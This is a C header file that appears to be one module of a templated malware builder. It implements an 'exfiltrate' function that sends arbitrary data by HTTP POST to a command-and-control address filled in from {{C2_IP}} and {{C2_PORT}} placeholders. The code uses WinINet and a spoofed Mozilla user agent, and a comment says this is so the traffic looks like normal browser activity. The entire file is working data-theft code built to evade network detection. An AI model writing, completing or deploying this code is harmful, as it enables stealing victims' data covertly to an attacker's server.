// chunk: exfil/http_post
// depends: core/emit_buffer
// provides: exfiltrate
// headers: winsock2.h, ws2tcpip.h, wininet.h
// libs: ws2_32, wininet
// note: uses WinINet for HTTP POST — looks like normal browser traffic

#ifndef CHUNK_HTTP_POST
#define CHUNK_HTTP_POST

#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/upload", ip, port);

    HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInet) return FALSE;

    // Set timeouts (10s) to prevent indefinite blocking
    DWORD timeout_ms = 10000;
    InternetSetOptionA(hInet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
    InternetSetOptionA(hInet, INTERNET_OPTION_SEND_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
    InternetSetOptionA(hInet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout_ms, sizeof(timeout_ms));

    char host_port[64];
    snprintf(host_port, sizeof(host_port), "%s:%d", ip, port);

    HINTERNET hConn = InternetConnectA(hInet, ip, port,
                                       NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return FALSE; }

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", "/upload", NULL, NULL, NULL,
                                      INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!hReq) {
        InternetCloseHandle(hConn);
        InternetCloseHandle(hInet);
        return FALSE;
    }

    const char *headers = "Content-Type: application/octet-stream\r\n";
    BOOL ok = HttpSendRequestA(hReq, headers, (DWORD)strlen(headers), (LPVOID)data, len);

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInet);
    return ok;
}

#endif
